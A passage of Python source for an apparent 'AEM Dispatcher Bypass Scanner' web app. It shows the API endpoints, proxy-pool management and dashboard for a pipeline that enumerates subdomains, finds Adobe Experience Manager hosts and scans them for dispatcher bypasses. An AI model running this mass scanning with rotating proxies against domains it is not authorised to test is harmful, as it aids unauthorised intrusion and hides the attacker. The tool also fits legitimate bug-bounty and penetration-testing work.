    Supports continue-from-phase via start_phase + uploaded_hosts.
    """
    # Resolve server-side upload ID → inline host list
    if req.uploaded_hosts_id and not req.uploaded_hosts:
        with _uploads_lock:
            upload_rec = _uploads.get(req.uploaded_hosts_id)
        if not upload_rec:
            raise HTTPException(status_code=400, detail="Upload ID not found or expired — re-upload the file")
        req.uploaded_hosts = upload_rec["hosts"]

    # For continue-from-phase, uploaded_hosts is enough (no domain needed)
    if not req.domain and not req.url and not req.urls and not req.uploaded_hosts:
        raise HTTPException(
            status_code=400,
            detail="Provide 'domain', 'url', 'urls', or 'uploaded_hosts' in request body",
        )

    scan_id = uuid.uuid4().hex[:12]
    scan = ScanState(
        scan_id=scan_id,
        threads=max(1, min(req.threads, 500)),
        per_host=max(1, min(req.per_host_concurrency, 50)),
        timeout=max(3, min(req.timeout, 30)),
        bypass_mode=req.bypass_mode,
    )

    if req.domain:
        scan.domain = req.domain.strip().lower()
    if req.url:
        scan.urls = [req.url.strip()]
    if req.urls:
        scan.urls = [u.strip() for u in req.urls if u.strip()]

    # ── Continue-from-phase: pre-populate data ──
    start_phase = max(1, min(req.start_phase, 4))
    scan._start_phase = start_phase

    if req.uploaded_hosts and start_phase >= 2:
        clean_hosts = [h.strip() for h in req.uploaded_hosts if h.strip()]
        if start_phase == 2:
            # Uploaded list = subdomains → run alive check on them
            scan.subdomains = clean_hosts
        elif start_phase == 3:
            # Uploaded list = alive hosts → run AEM detection on them
            scan.alive_hosts = [normalize_url(h) or h for h in clean_hosts]
        elif start_phase == 4:
            # Uploaded list = AEM hosts → run bypass scan on them
            scan.alive_hosts = [normalize_url(h) or h for h in clean_hosts]
            scan.aem_hosts = {
                (normalize_url(h) or h): {
                    "confidence": "confirmed",
                    "score": 0,
                    "reasons": ["uploaded"],
                }
                for h in clean_hosts
            }

    # Set up async message queue for WS dispatch
    loop = asyncio.get_event_loop()
    scan._loop = loop
    scan._msg_queue = asyncio.Queue()

    with scans_lock:
        scans[scan_id] = scan

    # Start WS dispatcher task
    asyncio.ensure_future(_ws_dispatcher(scan))

    # Run scan in background thread
    thread = threading.Thread(
        target=run_scan, args=(scan,), name=f"scan-{scan_id}", daemon=True
    )
    thread.start()

    # Tell the client how many hosts were loaded (so the feed shows real number not "?")
    host_count = (
        len(scan.subdomains) if scan.subdomains else
        len(scan.alive_hosts) if scan.alive_hosts else
        len(scan.aem_hosts)  if scan.aem_hosts  else 0
    )

    return JSONResponse(
        status_code=202,
        content={
            "scan_id": scan_id,
            "status": "started",
            "start_phase": start_phase,
            "host_count": host_count,
            "ws_url": f"/ws/{scan_id}",
            "status_url": f"/api/scan/{scan_id}/status",
            "results_url": f"/api/scan/{scan_id}/results",
        },
    )


@app.get("/api/scan/{scan_id}/status")
async def scan_status(scan_id: str) -> JSONResponse:
    """Get current scan status."""
    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    elapsed = 0.0
    if scan.started_at:
        end = scan.finished_at if scan.finished_at else time.time()
        elapsed = round(end - scan.started_at, 1)

    return JSONResponse({
        "scan_id": scan_id,
        "status": scan.status,
        "phase": scan.phase.value,
        "elapsed_seconds": elapsed,
        "subdomains_found": len(scan.subdomains),
        "alive_hosts": len(scan.alive_hosts),
        "aem_hosts_detected": len(
            [v for v in scan.aem_hosts.values() if v["confidence"] in ("confirmed", "suspected")]
        ),
        "vulnerabilities_found": len(scan.vulnerabilities),
    })


@app.get("/api/scan/{scan_id}/results")
async def scan_results(scan_id: str) -> JSONResponse:
    """
    Get scan results for UI restore.
    Large lists (subdomains / alive_hosts) are returned as counts only —
    use /api/scan/{id}/download/subdomains and /download/alive to stream them.
    AEM hosts and vulnerabilities are always returned in full (small lists).
    """
    INLINE_LIMIT = 5_000   # return inline only if list is small enough

    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    elapsed = 0.0
    if scan.started_at:
        end = scan.finished_at if scan.finished_at else time.time()
        elapsed = round(end - scan.started_at, 1)

    sub_count  = len(scan.subdomains)
    alive_count = len(scan.alive_hosts)

    resumable = scan.status in ("interrupted", "paused", "error")
    return JSONResponse({
        "scan_id":          scan_id,
        "status":           scan.status,
        "paused_reason":    scan.paused_reason,
        "phase":            scan.phase.value,
        "elapsed_seconds":  elapsed,
        "domain":           scan.domain,
        # internet status (live)
        "internet_up":      _internet_up,
        # resume metadata
        "resumable":        resumable,
        "resume_phase":     _determine_resume_phase(scan) if resumable else None,
        "progress": {
            "subdomains_count": sub_count,
            "alive_count":      alive_count,
            "aem_count":        len(scan.aem_hosts),
            "vuln_count":       len(scan.vulnerabilities),
            "phase2_cursor":    scan.phase2_cursor,
        },
        # counts always included
        "subdomains_count": sub_count,
        "alive_count":      alive_count,
        # inline only when small — prevents 800MB responses
        "subdomains":       scan.subdomains  if sub_count  <= INLINE_LIMIT else [],
        "alive_hosts":      scan.alive_hosts if alive_count <= INLINE_LIMIT else [],
        # AEM hosts + Next.js hosts + vulns — always small, always inline
        "aem_hosts":        scan.aem_hosts,
        "nextjs_hosts":     scan.nextjs_hosts,
        "vulnerabilities":  scan.vulnerabilities,
        "summary":          scan.vulnerability_summary,
    })


@app.get("/api/scan/{scan_id}/download/subdomains")
async def download_subdomains(scan_id: str):
    """Stream subdomains as plain text (one per line). Safe for 26M+ entries."""
    from fastapi.responses import StreamingResponse

    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    subs = scan.subdomains  # local ref — safe to iterate without lock

    def _gen():
        for s in subs:
            yield s + "\n"

    filename = f"subdomains_{scan_id}.txt"
    return StreamingResponse(
        _gen(),
        media_type="text/plain",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@app.get("/api/scan/{scan_id}/download/alive")
async def download_alive(scan_id: str):
    """Stream alive hosts as plain text (one per line)."""
    from fastapi.responses import StreamingResponse

    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    hosts = scan.alive_hosts

    def _gen():
        for h in hosts:
            yield h + "\n"

    filename = f"alive_{scan_id}.txt"
    return StreamingResponse(
        _gen(),
        media_type="text/plain",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@app.get("/api/scan/{scan_id}/download/vulnerabilities")
async def download_vulnerabilities(scan_id: str):
    """Stream vulnerabilities as plain text (one URL per line)."""
    from fastapi.responses import StreamingResponse

    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    vulns = scan.vulnerabilities

    def _gen():
        for v in vulns:
            url  = v.get("full_url") or v.get("url") or ""
            tag  = v.get("bypass") or v.get("technique") or ""
            ep   = v.get("endpoint") or ""
            line = url
            if tag: line += f" [{tag}]"
            if ep:  line += f" — {ep}"
            yield line + "\n"

    filename = f"vulnerabilities_{scan_id}.txt"
    return StreamingResponse(
        _gen(),
        media_type="text/plain",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@app.post("/api/scan/{scan_id}/cancel")
async def cancel_scan(scan_id: str) -> JSONResponse:
    """Cancel a running scan."""
    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    scan.cancelled = True
    return JSONResponse({"scan_id": scan_id, "status": "cancelling"})


@app.post("/api/scan/{scan_id}/resume")
async def resume_scan(scan_id: str) -> JSONResponse:
    """
    Resume an interrupted or paused scan from where it left off.
    Only allowed when status is 'interrupted', 'paused', or 'error'.
    """
    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    if scan.status == "running":
        return JSONResponse(
            status_code=400,
            content={"error": "Scan is already running"},
        )
    if scan.status == "complete":
        return JSONResponse(
            status_code=400,
            content={"error": "Scan already complete — start a new scan instead"},
        )
    if scan.status == "cancelled":
        return JSONResponse(
            status_code=400,
            content={"error": "Scan was cancelled — start a new scan instead"},
        )

    resume_phase = _determine_resume_phase(scan)
    # Start background thread
    t = threading.Thread(target=_run_scan_resumed, args=(scan,), daemon=True)
    t.start()

    return JSONResponse({
        "scan_id":      scan_id,
        "status":       "resuming",
        "resume_phase": resume_phase,
        "progress": {
            "subdomains":    len(scan.subdomains),
            "alive_hosts":   len(scan.alive_hosts),
            "aem_hosts":     len(scan.aem_hosts),
            "vulnerabilities": len(scan.vulnerabilities),
            "phase2_cursor": scan.phase2_cursor,
        },
    })


@app.delete("/api/scan/{scan_id}")
async def delete_scan(scan_id: str) -> JSONResponse:
    """Delete a scan from the registry."""
    with scans_lock:
        scan = scans.get(scan_id)
        if not scan:
            raise HTTPException(status_code=404, detail="Scan not found")
        # Cancel if still running
        scan.cancelled = True
        # Close WebSocket connections
        with scan.ws_lock:
            for ws in list(scan.ws_connections):
                try:
                    asyncio.ensure_future(ws.close(code=4001, reason="Scan deleted"))
                except Exception:
                    pass
            scan.ws_connections.clear()
        del scans[scan_id]
    _delete_persisted_scan(scan_id)
    return JSONResponse({"scan_id": scan_id, "deleted": True})


@app.post("/api/detect-nextjs")
async def detect_nextjs_endpoint(req: dict) -> JSONResponse:
    """
    Standalone Next.js detection for a single URL.
    Body: {"url": "https://example.com", "timeout": 15}
    """
    url = req.get("url", "").strip()
    if not url:
        raise HTTPException(status_code=400, detail="url is required")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    timeout = int(req.get("timeout", 15))
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, detect_nextjs_host, url, timeout)
    return JSONResponse({"url": url, **result})


@app.get("/api/internet")
async def internet_status() -> JSONResponse:
    """Return current internet connectivity status (polled by the UI badge)."""
    return JSONResponse({"up": _internet_up, "check_interval_up": _INTERNET_CHECK_INTERVAL_UP,
                         "check_interval_down": _INTERNET_CHECK_INTERVAL_DOWN})


@app.get("/api/scans")
async def list_scans() -> JSONResponse:
    """List all scans with rich metadata for the dashboard."""
    with scans_lock:
        result = []
        for sid, s in scans.items():
            elapsed = 0.0
            if s.started_at:
                end = s.finished_at if s.finished_at else time.time()
                elapsed = round(end - s.started_at, 1)
            confirmed = sum(1 for v in s.aem_hosts.values() if v.get("confidence") == "confirmed")
            suspected = sum(1 for v in s.aem_hosts.values() if v.get("confidence") == "suspected")
            resumable = s.status in ("interrupted", "paused", "error")
            result.append({
                "scan_id": sid,
                "status": s.status,
                "phase": s.phase.value,
                "domain": s.domain or (s.urls[0] if s.urls else "—"),
                "started_at": s.started_at,
                "finished_at": s.finished_at,
                "elapsed": elapsed,
                "subdomains": len(s.subdomains),
                "alive": len(s.alive_hosts),
                "aem_confirmed": confirmed,
                "aem_suspected": suspected,
                "aem_total": confirmed + suspected,
                "vulnerabilities": len(s.vulnerabilities),
                # Resume metadata
                "resumable":    resumable,
                "resume_phase": _determine_resume_phase(s) if resumable else None,
                "phase2_cursor": s.phase2_cursor,
            })
        # Sort newest first
        result.sort(key=lambda x: x["started_at"] or 0, reverse=True)
    return JSONResponse(result)


@app.get("/api/config")
async def get_config() -> JSONResponse:
    """Return sanitized server config (no secrets, just status flags)."""
    return JSONResponse({
        "c99_api_key_set": bool(C99_API_KEY),
        "c99_proxy_count": len(C99_PROXY_LIST),
        "c99_mode": "api" if C99_API_KEY else ("proxy-scrape" if C99_PROXY_LIST else "direct-scrape"),
        "my_ip": MY_PUBLIC_IP,
    })


@app.get("/api/proxies")
async def list_proxies() -> JSONResponse:
    """List current proxy pool."""
    with _c99_proxy_lock:
        pool = list(C99_PROXY_LIST)
    return JSONResponse({
        "count": len(pool),
        "proxies": pool,
        "my_ip": MY_PUBLIC_IP,
        "c99_mode": "api" if C99_API_KEY else ("proxy-scrape" if pool else "direct-scrape"),
    })


@app.post("/api/proxies/refresh")
async def refresh_proxies_endpoint() -> JSONResponse:
    """
    Fetch fresh free proxies in the background and update the pool.
    Returns immediately — poll /api/proxies to see results.
    """
    def _bg_refresh():
        fresh = fetch_fresh_proxies(min_working=10)
        with _c99_proxy_lock:
            for p in fresh:
                if p not in C99_PROXY_LIST:
                    C99_PROXY_LIST.append(p)
        log.info("Background proxy refresh done: +%d proxies (total: %d)", len(fresh), len(C99_PROXY_LIST))

    threading.Thread(target=_bg_refresh, daemon=True).start()
    return JSONResponse({"status": "refreshing", "message": "Fetching fresh proxies in background — check /api/proxies in ~20s"})


class ProxyBody(BaseModel):
    proxy: str

@app.post("/api/proxies/add")
async def add_proxy_endpoint(body: ProxyBody) -> JSONResponse:
    """Add a proxy to the pool."""
    proxy = body.proxy.strip()
    if not proxy:
        raise HTTPException(status_code=400, detail="proxy required")
    if not proxy.startswith(("http://", "https://", "socks5://", "socks4://")):
        proxy = "http://" + proxy
    _add_proxy(proxy)
    return JSONResponse({"added": proxy, "count": len(C99_PROXY_LIST)})

@app.post("/api/proxies/remove")
async def remove_proxy_endpoint(body: ProxyBody) -> JSONResponse:
    """Remove a proxy from the pool by URL or index."""
    p = body.proxy.strip()
    if p.isdigit():
        with _c99_proxy_lock:
            idx = int(p)
            if 0 <= idx < len(C99_PROXY_LIST):
                removed = C99_PROXY_LIST.pop(idx)
                return JSONResponse({"removed": removed, "count": len(C99_PROXY_LIST)})
    else:
        _remove_proxy(p)
    return JSONResponse({"removed": p, "count": len(C99_PROXY_LIST)})

@app.post("/api/proxies/clear")
async def clear_proxies_endpoint() -> JSONResponse:
    """Clear the entire proxy pool."""
    with _c99_proxy_lock:
        count = len(C99_PROXY_LIST)
        C99_PROXY_LIST.clear()
    return JSONResponse({"cleared": count})

@app.post("/api/proxies/test")
async def test_proxies_endpoint() -> JSONResponse:
    """
    Test all proxies in the current pool and evict dead ones.
    Returns list of working proxies with the IP they expose.
    """
    my_ip = _get_my_ip()

    def _test_all():
        results = []
        with _c99_proxy_lock:
            pool = list(C99_PROXY_LIST)
        for p in pool:
            works = _test_proxy(p, my_ip)
            if not works:
                _remove_proxy(p)
            else:
                try:
                    r = requests.get("https://api.ipify.org?format=json",
                                     proxies={"http": p, "https": p}, timeout=6)
                    exposed_ip = r.json().get("ip", "?")
                except Exception:
                    exposed_ip = "?"
                results.append({"proxy": p, "working": True, "ip": exposed_ip})
        return results

    loop = asyncio.get_event_loop()
    results = await loop.run_in_executor(None, _test_all)
    return JSONResponse({
        "my_ip": my_ip,
        "tested": len(results),
        "working": results,
    })


# ============================================================================
# HOST FILE UPLOAD  (server-side streaming — handles files of any size)
# ============================================================================
@app.post("/api/upload-hosts")
async def upload_hosts(file: UploadFile = File(...)) -> JSONResponse:
    """
    Stream-parse an uploaded host/subdomain list of any size.
    Returns an upload_id the frontend can pass to /api/scan as uploaded_hosts_id.

    Accepts:
      - One host/subdomain per line
      - Bare domains:  example.com
      - Full URLs:     https://example.com  (scheme stripped, just domain kept)
      - Blank lines and # comments are ignored
      - File size: unlimited (streamed, never fully loaded into memory)
    """
    upload_id = str(uuid.uuid4())
    hosts: list[str] = []
    seen: set[str] = set()
    filename = file.filename or "upload.txt"

    # Stream in 1MB chunks so RAM usage stays flat even for 1GB files
    buffer = b""
    total_bytes = 0

    while True:
        chunk = await file.read(1024 * 1024)  # 1 MB
        if not chunk:
            break
        total_bytes += len(chunk)
        buffer += chunk

        # Process complete lines from buffer
        lines = buffer.split(b"\n")
        buffer = lines[-1]          # keep the incomplete last line for next iteration
        for raw in lines[:-1]:
            line = raw.decode(errors="ignore").strip()
            if not line or line.startswith("#"):
                continue
            # Strip scheme if present
            for scheme in ("https://", "http://"):
                if line.lower().startswith(scheme):
                    line = line[len(scheme):]
                    break
            # Strip trailing path/port junk — keep just the host
            host = line.split("/")[0].split("?")[0].rstrip(":")
            if host and host not in seen:
                seen.add(host)
                hosts.append(host)

    # Process any remaining bytes in buffer
    if buffer:
        line = buffer.decode(errors="ignore").strip()
        if line and not line.startswith("#"):
            for scheme in ("https://", "http://"):
                if line.lower().startswith(scheme):
                    line = line[len(scheme):]
                    break
            host = line.split("/")[0].split("?")[0].rstrip(":")
            if host and host not in seen:
                hosts.append(host)

    if not hosts:
        raise HTTPException(status_code=400, detail="No valid hosts found in file")

    # Store in upload registry (expires after 2h to free memory)
    with _uploads_lock:
        # Evict uploads older than 2h
        now = time.time()
        stale = [uid for uid, u in _uploads.items() if now - u["created_at"] > 7200]
        for uid in stale:
            del _uploads[uid]
        _uploads[upload_id] = {
            "hosts": hosts,
            "filename": filename,
            "count": len(hosts),
            "created_at": now,
        }

    log.info("upload-hosts: %s — %d hosts from %s (%d bytes)", upload_id, len(hosts), filename, total_bytes)
    return JSONResponse({
        "upload_id": upload_id,
        "filename": filename,
        "count": len(hosts),
        "size_bytes": total_bytes,
        "preview": hosts[:5],          # first 5 hosts for UI confirmation
        "capped": False,
    })


@app.get("/api/upload-hosts/{upload_id}")
async def get_upload(upload_id: str) -> JSONResponse:
    with _uploads_lock:
        u = _uploads.get(upload_id)
    if not u:
        raise HTTPException(status_code=404, detail="Upload not found or expired")
    return JSONResponse({"upload_id": upload_id, "count": u["count"], "filename": u["filename"]})


# ============================================================================
# WEBSOCKET
# ============================================================================
@app.websocket("/ws/{scan_id}")
async def websocket_endpoint(websocket: WebSocket, scan_id: str) -> None:
    """WebSocket endpoint for real-time scan updates."""
    with scans_lock:
        scan = scans.get(scan_id)

    if not scan:
        await websocket.close(code=4004, reason="Scan not found")
        return

    await websocket.accept()

    with scan.ws_lock:
        scan.ws_connections.append(websocket)

    # Send current status immediately
    await websocket.send_json({
        "type": "connected",
        "scan_id": scan_id,
        "status": scan.status,
        "phase": scan.phase.value,
    })

    # Replay log history so late connections see all past messages
    with scan._log_history_lock:
        history = list(scan._log_history)
    for hist_msg in history:
        try:
            replay = {**hist_msg, "replay": True}
            await websocket.send_json(replay)
        except Exception:
            break

    try:
        while True:
            # Keep connection alive; client can send pings
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_json({"type": "pong"})
    except WebSocketDisconnect:
        pass
    finally:
        with scan.ws_lock:
            if websocket in scan.ws_connections:
                scan.ws_connections.remove(websocket)


# ============================================================================
# FRONTEND (SELF-CONTAINED)
# ============================================================================
FRONTEND_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AEM Dispatcher Bypass Scanner</title>
<style>
  :root {
    --bg: #0a0e17;
    --surface: #111827;
    --surface2: #1a2332;
    --border: #1e293b;
    --text: #e2e8f0;
    --text-dim: #64748b;
    --accent: #3b82f6;
    --green: #22c55e;
    --yellow: #eab308;
    --red: #ef4444;
    --orange: #f97316;
    --purple: #a855f7;
    --cyan: #06b6d4;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    padding: 20px;
  }
  .header {
    text-align: center;
    padding: 30px 0 20px;
    border-bottom: 1px solid var(--border);
    margin-bottom: 24px;
  }
  .header h1 {
    font-size: 1.6rem;
    color: var(--cyan);
    letter-spacing: 2px;
  }
  .header .sub {
    color: var(--text-dim);
    font-size: 0.75rem;
    margin-top: 4px;
  }
  .input-section {
    max-width: 720px;
    margin: 0 auto 24px;
    display: flex;
    gap: 10px;
  }
  .input-section input {
    flex: 1;
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 12px 16px;
    font-family: inherit;
    font-size: 0.9rem;
    border-radius: 6px;
    outline: none;
    transition: border-color 0.2s;
  }
  .input-section input:focus { border-color: var(--accent); }
  .input-section input::placeholder { color: var(--text-dim); }
  .btn {
    background: var(--accent);
    color: white;
    border: none;
    padding: 12px 24px;
    font-family: inherit;
    font-size: 0.85rem;
    font-weight: 600;
    border-radius: 6px;
    cursor: pointer;
    white-space: nowrap;
    transition: opacity 0.2s;
  }
  .btn:hover { opacity: 0.85; }
  .btn:disabled { opacity: 0.4; cursor: not-allowed; }
  .btn-cancel {
    background: var(--red);
    padding: 12px 18px;
  }
  .phases {
    max-width: 900px;
    margin: 0 auto 20px;
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 10px;
  }
  .phase-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 14px;
    text-align: center;
  }
  .phase-card .num {
    font-size: 1.4rem;
    font-weight: 700;
    color: var(--text-dim);
  }
  .phase-card .label {
    font-size: 0.7rem;
    color: var(--text-dim);
    margin-top: 4px;
  }
  .phase-card .value {
    font-size: 1.1rem;
    font-weight: 600;
    margin-top: 6px;
    color: var(--text-dim);
  }
  .phase-card.active { border-color: var(--accent); }
  .phase-card.active .num { color: var(--accent); }
  .phase-card.done { border-color: var(--green); }
  .phase-card.done .num { color: var(--green); }
  .phase-card.done .value { color: var(--green); }
  .progress-bar-container {
    max-width: 900px;
    margin: 0 auto 20px;
    background: var(--surface);
    border-radius: 6px;
    overflow: hidden;
    height: 28px;
    position: relative;
    display: none;
  }
  .progress-bar-container.visible { display: block; }
  .progress-bar-fill {
    height: 100%;
    background: linear-gradient(90deg, var(--accent), var(--cyan));
    transition: width 0.3s ease;
    width: 0%;
  }
  .progress-bar-text {
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 0.7rem;
    color: white;
    text-shadow: 0 1px 2px rgba(0,0,0,0.5);
  }
  .results-grid {
    max-width: 1200px;
    margin: 0 auto;
    display: grid;
    gap: 16px;
  }
  .section {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 16px;
  }
  .section h3 {
    font-size: 0.85rem;
    color: var(--cyan);
    margin-bottom: 10px;
    letter-spacing: 1px;
  }
  .log-area {
    max-height: 320px;
    overflow-y: auto;
    font-size: 0.75rem;
    line-height: 1.7;
  }
  .log-entry {
    padding: 2px 0;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: flex-start;
    gap: 8px;
    flex-wrap: wrap;
  }
  .log-entry:last-child { border-bottom: none; }
  .tag {
    display: inline-block;
    padding: 1px 6px;
    border-radius: 3px;
    font-size: 0.65rem;
    font-weight: 600;
    flex-shrink: 0;
  }
  .tag-confirmed { background: rgba(34,197,94,0.15); color: var(--green); }
  .tag-suspected { background: rgba(234,179,8,0.15); color: var(--yellow); }
  .tag-vuln { background: rgba(239,68,68,0.15); color: var(--red); }
  .tag-bypass { background: rgba(168,85,247,0.15); color: var(--purple); }
  .tag-info { background: rgba(59,130,246,0.1); color: var(--accent); }
  .host { color: var(--cyan); }
  .dim { color: var(--text-dim); }
  .vuln-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 0.72rem;
  }
  .vuln-table th {
    text-align: left;
    padding: 8px 6px;
    color: var(--text-dim);
    border-bottom: 1px solid var(--border);
    font-weight: 500;
    white-space: nowrap;
  }
  .vuln-table td {
    padding: 6px;
    border-bottom: 1px solid var(--border);
    word-break: break-all;
  }
  .vuln-table tr:hover { background: var(--surface2); }
  .summary-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
    gap: 12px;
  }
  .stat-card {
    background: var(--surface2);
    border-radius: 6px;
    padding: 14px;
    text-align: center;
  }
  .stat-card .val {
    font-size: 1.8rem;
    font-weight: 700;
  }
  .stat-card .lbl {
    font-size: 0.65rem;
    color: var(--text-dim);
    margin-top: 4px;
  }
  .stat-green .val { color: var(--green); }
  .stat-red .val { color: var(--red); }
  .stat-yellow .val { color: var(--yellow); }
  .stat-blue .val { color: var(--accent); }
  .stat-cyan .val { color: var(--cyan); }
  @media (max-width: 700px) {
    .phases { grid-template-columns: repeat(2, 1fr); }
    .input-section { flex-direction: column; }
  }
</style>
</head>
<body>
<div class="header">
  <h1>AEM DISPATCHER BYPASS SCANNER</h1>
  <div class="sub">subfinder &rarr; httpx &rarr; AEM-Detect &rarr; Bypass-Scan &nbsp;|&nbsp; ref: SL Cyber / infosec_au / Muhammad Waseem</div>
</div>

<div class="input-section">
  <input type="text" id="targetInput" placeholder="Enter domain (e.g. intel.com) or URL (https://target.com)">
  <button class="btn" id="scanBtn" onclick="startScan()">SCAN</button>
  <button class="btn btn-cancel" id="cancelBtn" onclick="cancelScan()" style="display:none">CANCEL</button>
</div>

<div class="phases" id="phases">
  <div class="phase-card" id="phase1">
    <div class="num">1</div>
    <div class="label">SUBDOMAINS</div>
    <div class="value" id="p1val">--</div>
  </div>
  <div class="phase-card" id="phase2">
    <div class="num">2</div>
    <div class="label">ALIVE HOSTS</div>
    <div class="value" id="p2val">--</div>
  </div>
  <div class="phase-card" id="phase3">
    <div class="num">3</div>
    <div class="label">AEM DETECTED</div>
    <div class="value" id="p3val">--</div>
  </div>
  <div class="phase-card" id="phase4">
    <div class="num">4</div>
    <div class="label">VULNS FOUND</div>
    <div class="value" id="p4val">--</div>
  </div>
</div>

<div class="progress-bar-container" id="progressBar">
  <div class="progress-bar-fill" id="progressFill"></div>
  <div class="progress-bar-text" id="progressText"></div>
</div>

<div class="results-grid" id="results" style="display:none">
  <div class="section" id="summarySection" style="display:none">
    <h3>SCAN SUMMARY</h3>
    <div class="summary-grid" id="summaryGrid"></div>
  </div>

  <div class="section" id="vulnSection" style="display:none">
    <h3>VULNERABILITIES</h3>
    <table class="vuln-table">
      <thead>
        <tr>
          <th>Host</th>
          <th>Endpoint</th>
          <th>Bypass</th>
          <th>Status</th>
          <th>Size</th>
          <th>Type</th>
        </tr>
      </thead>
      <tbody id="vulnBody"></tbody>
    </table>
  </div>

  <div class="section">
    <h3>AEM HOSTS</h3>
    <div class="log-area" id="aemLog"></div>
  </div>

  <div class="section">
    <h3>LIVE LOG</h3>
    <div class="log-area" id="liveLog"></div>
  </div>
</div>

<script>
let ws = null;
let currentScanId = null;
let aemCount = 0;
let vulnCount = 0;

function startScan() {
  const input = document.getElementById('targetInput').value.trim();
  if (!input) return;

  const body = {};
  if (input.startsWith('http://') || input.startsWith('https://')) {
    body.url = input;
  } else {
    body.domain = input;
  }

  document.getElementById('scanBtn').disabled = true;
  document.getElementById('cancelBtn').style.display = '';
  document.getElementById('results').style.display = 'grid';
  document.getElementById('liveLog').innerHTML = '';
  document.getElementById('aemLog').innerHTML = '';
  document.getElementById('vulnBody').innerHTML = '';
  document.getElementById('summarySection').style.display = 'none';
  document.getElementById('vulnSection').style.display = 'none';
  aemCount = 0;
  vulnCount = 0;
  resetPhases();

  fetch('/api/scan', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body),
  })
  .then(r => r.json())
  .then(data => {
    currentScanId = data.scan_id;
    connectWS(data.scan_id);
    addLog('info', 'Scan started: ' + data.scan_id);
  })
  .catch(e => {
    addLog('info', 'Error starting scan: ' + e);
    document.getElementById('scanBtn').disabled = false;
    document.getElementById('cancelBtn').style.display = 'none';
  });
}

function cancelScan() {
  if (!currentScanId) return;
  fetch('/api/scan/' + currentScanId + '/cancel', { method: 'POST' });
  addLog('info', 'Cancelling scan...');
}

function connectWS(scanId) {
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  ws = new WebSocket(proto + '://' + location.host + '/ws/' + scanId);

  ws.onmessage = function(e) {
    const msg = JSON.parse(e.data);
    handleMessage(msg);
  };
  ws.onclose = function() {
    document.getElementById('scanBtn').disabled = false;
    document.getElementById('cancelBtn').style.display = 'none';
  };
  ws.onerror = function() {
    addLog('info', 'WebSocket error');
  };
}

function handleMessage(msg) {
  switch(msg.type) {
    case 'phase':
      handlePhase(msg);
      break;
    case 'progress':
      handleProgress(msg);
      break;
    case 'host_found':
      addLog('info', '<span class="host">' + esc(msg.host) + '</span> <span class="dim">' + msg.status + '</span>');
      break;
    case 'aem_detected':
      aemCount++;
      document.getElementById('p3val').textContent = aemCount;
      const cls = msg.confidence === 'confirmed' ? 'tag-confirmed' : 'tag-suspected';
      const aemEntry = '<span class="tag ' + cls + '">' + msg.confidence.toUpperCase() + '</span> '
        + '<span class="host">' + esc(msg.host) + '</span> '
        + '<span class="dim">score:' + msg.score + ' | ' + msg.reasons.slice(0,5).join(', ') + '</span>';
      document.getElementById('aemLog').innerHTML += '<div class="log-entry">' + aemEntry + '</div>';
      break;
    case 'vulnerability':
      vulnCount++;
      document.getElementById('p4val').textContent = vulnCount;
      document.getElementById('vulnSection').style.display = '';
      const row = '<tr>'
        + '<td class="host">' + esc(msg.host) + '</td>'
        + '<td>' + esc(msg.endpoint) + '</td>'
        + '<td><span class="tag tag-bypass">' + esc(msg.bypass) + '</span></td>'
        + '<td style="color:var(--green)">' + msg.status_code + '</td>'
        + '<td class="dim">' + msg.size + 'B</td>'
        + '<td class="dim">' + esc(msg.content_type || '') + '</td>'
        + '</tr>';
      document.getElementById('vulnBody').innerHTML += row;
      addLog('vuln', '<span class="tag tag-vuln">VULN</span> <span class="tag tag-bypass">' + esc(msg.bypass) + '</span> ' + esc(msg.full_url || ''));
      break;
    case 'scan_complete':
      handleComplete(msg);
      break;
    case 'connected':
      addLog('info', 'Connected to scan ' + msg.scan_id);
      break;
  }
}

function handlePhase(msg) {
  const card = document.getElementById('phase' + msg.phase);
  if (!card) return;
  if (msg.status === 'running') {
    card.className = 'phase-card active';
    showProgress(true);
  } else if (msg.status === 'complete') {
    card.className = 'phase-card done';
    if (msg.count !== undefined) {
      document.getElementById('p' + msg.phase + 'val').textContent = msg.count;
    }
    if (msg.phase === 3) {
      document.getElementById('p3val').textContent = (msg.confirmed || 0) + '/' + (msg.suspected || 0);
    }
    if (msg.phase === 4) {
      document.getElementById('p4val').textContent = msg.total_hits || vulnCount;
    }
  } else if (msg.status === 'skipped') {
    card.className = 'phase-card done';
    document.getElementById('p' + msg.phase + 'val').textContent = 'skip';
  }
